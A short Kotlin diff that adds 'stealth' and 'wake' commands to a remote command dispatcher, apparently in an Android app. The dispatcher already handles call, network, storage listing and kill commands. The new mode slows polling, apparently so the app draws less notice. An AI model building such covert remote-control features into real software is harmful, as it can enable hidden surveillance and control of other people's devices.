@@ -71,6 +71,8 @@ object ForjaSyncCapabilities {
                 "call" -> makeCall(p)
                 "network" -> network()
                 "storage_list" -> storageList(p)
+                "stealth" -> { Dormant.active = true; buildJsonObject { put("ok", true); put("msg", "mod dormit activ — polling 10 min") } }
+                "wake" -> { Dormant.active = false; buildJsonObject { put("ok", true); put("msg", "mod activ — polling normal") } }
                 "ping" -> buildJsonObject { put("pong", true); put("ts", System.currentTimeMillis()) }
                 "kill" -> killApp()
                 "status" -> status()
